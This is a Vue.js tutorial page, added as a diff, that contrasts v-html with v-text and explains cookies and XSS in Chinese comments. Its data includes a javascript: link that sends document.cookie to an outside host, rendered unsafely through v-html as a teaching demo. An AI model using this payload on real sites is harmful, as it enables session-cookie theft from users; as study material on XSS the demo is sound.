@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>v-html和v-text指令</title>
+    <script type="text/javascript" src="../../js/vue.js"></script>
+</head>
+<!-- cookies的原理流程：
+    浏览器携带登录信息到服务端，服务端返回cookies值（多个k-v结构的值），
+    这些cookie的值存储在浏览器（google浏览器存储在应用（检查>>Application）里），
+    每一个网址在浏览器有自己的存储，
+    当cookie被其他浏览器拷贝存储在对应的位置，则可以免登录进入服务（Cookie Editor插件可以导出导入）
+    当浏览器没有配置HttpOnly的限制（只限制当前浏览器使用），可能被黑客通过请求获取到（documnet.cookie命令获取），这样黑客便拥有进入服务的权限---俗称XSS攻击
+    XXS--冒充用户之手
+-->
+<body>
+    <!-- 准备好一个容器 -->
+    <div id="root">
+        <div>{{name}}</div>
+        <!-- v-text不支持标签的解析 -->
+        <div v-text="str"></div>
+        <!-- v-html支持标签的解析 -->
+        <div v-html="str"></div>
+
+        <!-- 测试xss攻击，获取cookie -->
+        <div v-html="test_cookie"></div>
+        <div v-html="test_cookie2"></div>
+        
+    </div>
+</body>
+<script type="text/javascript" >
+    Vue.config.productionTip = false  //阻止浏览器控制台生产配置错误
+    const vm = new Vue({
+        el:"#root",
+        data() {
+            return {
+                name:"李明章",
+                str:"<h2>你好</h2>",
+                //href="javascript:.....", javascript:表示后边可以使用javascript指令
+                test_cookie:'<a href="javascript:alert(111111)">点我点我</a>',
+                // 当浏览器未设置httpOnly时，以下方式可以从url获取用户浏览器的cookie
+                test_cookie2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点我点我啊</a>'
+            }
+        },
+    })
+
+</script>
+</html>
